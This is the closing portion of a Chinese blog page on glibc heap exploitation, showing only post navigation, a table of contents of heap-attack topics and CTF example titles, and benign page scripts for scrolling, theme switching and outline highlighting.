+</div> <nav class="article-nav" style="display: flex; justify-content: space-between; margin-top: 64px; padding-top: 32px; border-top: 1px solid var(--line);"> <div class="nav-prev" style="flex: 1;"> <a href="/posts/二进制/pwn/WSL_PWN环境搭建/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">&larr; 上一篇</p> <h4 style="margin: 8px 0 0; color: var(--ink);">WSL_PWN环境搭建</h4> </a> </div> <div class="nav-next" style="flex: 1; text-align: right;"> <a href="/posts/二进制/pwn/栈漏洞/" style="text-decoration: none;"> <p class="muted" style="margin: 0; font-size: 0.9rem; color: var(--muted);">下一篇 &rarr;</p> <h4 style="margin: 8px 0 0; color: var(--ink);">保护机制</h4> </a> </div> </nav> </div> </article>  <aside class="article-sidebar" id="article-sidebar"> <nav class="article-outline" aria-label="文章目录"> <div class="article-outline__head"> <strong>目录</strong> </div> <div class="article-outline__body"> <ol class="article-outline__list article-outline__list--groups"> <li class="article-outline__group" data-group-id="section-1"> <button class="article-outline__group-link" type="button" data-group-target="section-1"> <span>arena</span>  </button>  </li><li class="article-outline__group" data-group-id="section-2"> <button class="article-outline__group-link" type="button" data-group-target="section-2"> <span>malloca过程</span>  </button>  </li><li class="article-outline__group" data-group-id="section-3"> <button class="article-outline__group-link" type="button" data-group-target="section-3"> <span>free过程</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-4"> <a href="#section-4">Allocated chunk</a> </li><li class="article-outline__item depth-3" data-toc-id="section-5"> <a href="#section-5">Free chunk</a> </li><li class="article-outline__item depth-3" data-toc-id="section-6"> <a href="#section-6">Top chunk</a> </li><li class="article-outline__item depth-3" data-toc-id="section-7"> <a href="#section-7">Last Remainder chunk</a> </li><li class="article-outline__item depth-3" data-toc-id="section-8"> <a href="#section-8">fastbins</a> </li><li class="article-outline__item depth-3" data-toc-id="section-9"> <a href="#section-9">small bins</a> </li><li class="article-outline__item depth-3" data-toc-id="section-10"> <a href="#section-10">unsorted bins</a> </li><li class="article-outline__item depth-3" data-toc-id="section-11"> <a href="#section-11">large bins</a> </li><li class="article-outline__item depth-3" data-toc-id="section-12"> <a href="#section-12">tcache bins</a> </li><li class="article-outline__item depth-3" data-toc-id="section-13"> <a href="#section-13">glibc2.23</a> </li><li class="article-outline__item depth-3" data-toc-id="section-14"> <a href="#section-14">glibc2.27</a> </li><li class="article-outline__item depth-3" data-toc-id="section-15"> <a href="#section-15">glibc2.31</a> </li><li class="article-outline__item depth-3" data-toc-id="section-16"> <a href="#section-16">glibc2.32</a> </li><li class="article-outline__item depth-3" data-toc-id="section-17"> <a href="#section-17">glibc2.35</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-18"> <button class="article-outline__group-link" type="button" data-group-target="section-18"> <span>介绍</span>  </button>  </li><li class="article-outline__group" data-group-id="section-19"> <button class="article-outline__group-link" type="button" data-group-target="section-19"> <span>例题</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-20"> <a href="#section-20">magicbook(libc-2.35+orw)</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-21"> <button class="article-outline__group-link" type="button" data-group-target="section-21"> <span>gundam (libc-2.26)</span>  </button>  </li><li class="article-outline__group" data-group-id="section-22"> <button class="article-outline__group-link" type="button" data-group-target="section-22"> <span>chunk overlap 向后合并</span>  </button>  </li><li class="article-outline__group" data-group-id="section-23"> <button class="article-outline__group-link" type="button" data-group-target="section-23"> <span>unlink机制</span>  </button>  </li><li class="article-outline__group" data-group-id="section-24"> <button class="article-outline__group-link" type="button" data-group-target="section-24"> <span>off by one</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-25"> <a href="#section-25">介绍</a> </li><li class="article-outline__item depth-3" data-toc-id="section-26"> <a href="#section-26">例题</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-27"> <button class="article-outline__group-link" type="button" data-group-target="section-27"> <span>off by null</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-28"> <a href="#section-28">介绍</a> </li><li class="article-outline__item depth-3" data-toc-id="section-29"> <a href="#section-29">攻击思路</a> </li><li class="article-outline__item depth-3" data-toc-id="section-30"> <a href="#section-30">例题</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-31"> <button class="article-outline__group-link" type="button" data-group-target="section-31"> <span>介绍：</span>  </button>  </li><li class="article-outline__group" data-group-id="section-32"> <button class="article-outline__group-link" type="button" data-group-target="section-32"> <span>原理：</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-33"> <a href="#section-33">探究一下如何控制topchunk的地址</a> </li><li class="article-outline__item depth-3" data-toc-id="section-34"> <a href="#section-34">house of force中对top chunk的size进行的检查</a> </li><li class="article-outline__item depth-3" data-toc-id="section-35"> <a href="#section-35">house of force手法总结</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-36"> <button class="article-outline__group-link" type="button" data-group-target="section-36"> <span>例题</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-37"> <a href="#section-37">143</a> </li><li class="article-outline__item depth-3" data-toc-id="section-38"> <a href="#section-38">bcloudbctf2016</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-39"> <button class="article-outline__group-link" type="button" data-group-target="section-39"> <span>介绍</span>  </button>  </li><li class="article-outline__group" data-group-id="section-40"> <button class="article-outline__group-link" type="button" data-group-target="section-40"> <span>原理</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-41"> <a href="#section-41">绕过vtable check</a> </li><li class="article-outline__item depth-3" data-toc-id="section-42"> <a href="#section-42">exit调用链和源码分析</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-43"> <button class="article-outline__group-link" type="button" data-group-target="section-43"> <span>例题</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-44"> <a href="#section-44">ciscn2024 ezheap</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-45"> <button class="article-outline__group-link" type="button" data-group-target="section-45"> <span>介绍</span>  </button>  </li><li class="article-outline__group" data-group-id="section-46"> <button class="article-outline__group-link" type="button" data-group-target="section-46"> <span>例题</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-47"> <a href="#section-47">hgame2025 where is my vulnrability</a> </li> </ol> </li><li class="article-outline__group" data-group-id="section-48"> <button class="article-outline__group-link" type="button" data-group-target="section-48"> <span>FILE结构体</span> <span class="article-outline__group-caret" aria-hidden="true">›</span> </button> <ol class="article-outline__sublist"> <li class="article-outline__item depth-3" data-toc-id="section-49"> <a href="#section-49">IOFILEplus</a> </li><li class="article-outline__item depth-3" data-toc-id="section-50"> <a href="#section-50">IOFILE</a> </li><li class="article-outline__item depth-3" data-toc-id="section-51"> <a href="#section-51">IOjumpt (vtable)</a> </li> </ol> </li> </ol> </div> </nav> </aside> <button class="article-toc-fab" id="article-toc-fab" type="button" aria-expanded="false" aria-controls="article-sidebar" aria-label="切换目录"> <span class="article-toc-fab__icon">☰</span> </button>  </div> </div>  </main> <script>
+      (() => {
+        const root = document.documentElement;
+        const scrollFlagKey = "scroll-to-top-once";
+
+        const bindScrollReset = () => {
+          try {
+            if ("scrollRestoration" in history) {
+              history.scrollRestoration = "manual";
+            }
+
+            if (sessionStorage.getItem(scrollFlagKey) === "1") {
+              sessionStorage.removeItem(scrollFlagKey);
+              requestAnimationFrame(() => window.scrollTo({ top: 0, left: 0, behavior: "auto" }));
+            }
+          } catch {}
+
+          document.addEventListener("click", (event) => {
+            const target = event.target;
+            if (!(target instanceof Element)) return;
+
+            const link = target.closest("a");
+            if (!(link instanceof HTMLAnchorElement)) return;
+
+            if (link.target && link.target !== "_self") return;
+            if (link.hasAttribute("download")) return;
+
+            const href = link.getAttribute("href");
+            if (!href || href.startsWith("#")) return;
+
+            try {
+              const url = new URL(link.href, window.location.href);
+              if (url.origin !== window.location.origin) return;
+              if (url.pathname === window.location.pathname && url.hash) return;
+              sessionStorage.setItem(scrollFlagKey, "1");
+            } catch {}
+          });
+        };
+
+        const bindToggle = () => {
+          const btn = document.getElementById("theme-toggle");
+          if (!btn) return;
+          const next = btn.cloneNode(true);
+          btn.replaceWith(next);
+          next.addEventListener("click", () => {
+            const current = root.getAttribute("data-theme") === "dark" ? "dark" : "light";
+            const value = current === "dark" ? "light" : "dark";
+            root.setAttribute("data-theme", value);
+            try {
+              localStorage.setItem("theme", value);
+            } catch {}
+          });
+        };
+
+        bindScrollReset();
+        bindToggle();
+      })();
+    </script> </body> </html>  <script>
+      (() => {
+        const shell = document.getElementById("article-shell");
+        const sidebar = document.getElementById("article-sidebar");
+        const fab = document.getElementById("article-toc-fab");
+        const outlineNav = sidebar?.querySelector(".article-outline__body");
+        const headings = Array.from(document.querySelectorAll(".article-content h2[id], .article-content h3[id]"));
+        const groupLinks = Array.from(document.querySelectorAll(".article-outline__group-link"));
+        const childLinks = Array.from(document.querySelectorAll(".article-outline__sublist a"));
+        const storageKey = "article-outline-open";
+
+        if (!shell || !sidebar || !fab || !outlineNav || !headings.length || !groupLinks.length) return;
+
+        let isOpen = false;
+        let activeId = "";
+        let activeGroupId = "";
+        let manualOpenGroupId = "";
+        let ticking = false;
+        let suppressOutlineScrollUntil = 0;
+
+        const syncState = () => {
+          shell.classList.toggle("article-shell--toc-expanded", isOpen);
+          shell.classList.toggle("article-shell--toc-collapsed", !isOpen);
+          sidebar.classList.toggle("is-open", isOpen);
+          fab.classList.toggle("is-open", isOpen);
+          fab.setAttribute("aria-expanded", String(isOpen));
+
+          try {
+            localStorage.setItem(storageKey, isOpen ? "1" : "0");
+          } catch {}
+        };
+
+        const groupMap = new Map(
+          groupLinks.map((link) => {
+            const id = link.getAttribute("data-group-target") || "";
+            return [id, link.closest(".article-outline__group")];
+          }),
+        );
+
+        let lastH2Id = "";
+        const headingMeta = headings.map((heading) => {
+          const depth = Number(heading.tagName.slice(1));
+          if (depth === 2) lastH2Id = heading.id;
+          return {
+            id: heading.id,
+            depth,
+            parentId: depth === 3 ? lastH2Id : "",
+            element: heading,
+          };
+        });
+
+        const pauseOutlineAutoScroll = (duration = 900) => {
+          suppressOutlineScrollUntil = Date.now() + duration;
+        };
+
+        const setActive = (id, parentId = "") => {
+          if (!id || (id === activeId && parentId === activeGroupId)) return;
+
+          activeId = id;
+          activeGroupId = parentId || id;
+
+          groupLinks.forEach((link) => {
+            const targetId = link.getAttribute("data-group-target") || "";
+            const isCurrentGroup = targetId === activeGroupId;
+            const isOpenGroup = targetId === activeGroupId || targetId === manualOpenGroupId;
+            link.toggleAttribute("aria-current", targetId === id && !parentId);
+            link.classList.toggle("is-current", targetId === id && !parentId);
+            link.classList.toggle("is-open", isOpenGroup);
+            link.classList.toggle("is-active-group", isCurrentGroup);
+          });
+
+          childLinks.forEach((link) => {
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            const isCurrent = targetId === id;
+            link.toggleAttribute("aria-current", isCurrent);
+            link.classList.toggle("is-current", isCurrent);
+          });
+
+          groupMap.forEach((group, groupId) => {
+            if (!group) return;
+            group.classList.toggle("is-open", groupId === activeGroupId || groupId === manualOpenGroupId);
+            group.classList.toggle("is-current", groupId === id && !parentId);
+          });
+
+          if (!isOpen || Date.now() < suppressOutlineScrollUntil) return;
+
+          const activeLink = [...groupLinks, ...childLinks].find((link) => {
+            const href = link.getAttribute("href");
+            if (href) return decodeURIComponent(href.replace(/^#/, "")) === id;
+            return (link.getAttribute("data-group-target") || "") === id;
+          });
+          if (!activeLink) return;
+
+          const linkTop = activeLink.offsetTop;
+          const linkBottom = linkTop + activeLink.offsetHeight;
+          const viewTop = outlineNav.scrollTop;
+          const viewBottom = viewTop + outlineNav.clientHeight;
+          const padding = 24;
+
+          if (linkTop - padding < viewTop) {
+            outlineNav.scrollTo({ top: Math.max(linkTop - padding, 0), behavior: "smooth" });
+          } else if (linkBottom + padding > viewBottom) {
+            outlineNav.scrollTo({
+              top: linkBottom - outlineNav.clientHeight + padding,
+              behavior: "smooth",
+            });
+          }
+        };
+
+        const updateOutline = () => {
+          ticking = false;
+
+          let current = headingMeta[0];
+          for (const heading of headingMeta) {
+            if (heading.element.getBoundingClientRect().top <= 160) {
+              current = heading;
+            } else {
+              break;
+            }
+          }
+
+          if (current) {
+            setActive(current.id, current.parentId);
+          }
+        };
+
+        const requestUpdate = () => {
+          if (ticking) return;
+          ticking = true;
+          window.requestAnimationFrame(updateOutline);
+        };
+
+        try {
+          isOpen = localStorage.getItem(storageKey) === "1";
+        } catch {
+          isOpen = false;
+        }
+
+        syncState();
+
+        groupLinks.forEach((button) => {
+          button.addEventListener("click", (event) => {
+            event.stopPropagation();
+            const groupId = button.getAttribute("data-group-target") || "";
+            if (!groupId) return;
+
+            if (manualOpenGroupId === groupId) {
+              manualOpenGroupId = "";
+            } else {
+              manualOpenGroupId = groupId;
+            }
+
+            if (activeGroupId) {
+              setActive(activeId || activeGroupId, activeGroupId);
+            }
+
+            const targetHeading = document.getElementById(groupId);
+            targetHeading?.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        childLinks.forEach((link) => {
+          link.addEventListener("click", (event) => {
+            event.preventDefault();
+            event.stopPropagation();
+
+            const targetId = decodeURIComponent((link.getAttribute("href") || "").replace(/^#/, ""));
+            if (!targetId) return;
+
+            const targetMeta = headingMeta.find((item) => item.id === targetId);
+            if (!targetMeta) return;
+
+            pauseOutlineAutoScroll(1200);
+            setActive(targetMeta.id, targetMeta.parentId);
+
+            if (location.hash !== `#${targetId}`) {
+              history.pushState(null, "", `#${targetId}`);
+            }
+
+            targetMeta.element.scrollIntoView({ behavior: "smooth", block: "start" });
+          });
+        });
+
+        fab.addEventListener("click", (event) => {
+          event.stopPropagation();
+          isOpen = !isOpen;
+          syncState();
+        });
+
+        sidebar.addEventListener("click", (event) => {
+          event.stopPropagation();
+        });
+
+        document.addEventListener("keydown", (event) => {
+          if (event.key === "Escape" && isOpen) {
+            isOpen = false;
+            syncState();
+            fab.focus();
+          }
+        });
+
+        window.addEventListener("scroll", requestUpdate, { passive: true });
+        window.addEventListener("resize", requestUpdate);
+        window.addEventListener("hashchange", requestUpdate);
+        requestUpdate();
+      })();
+    </script>
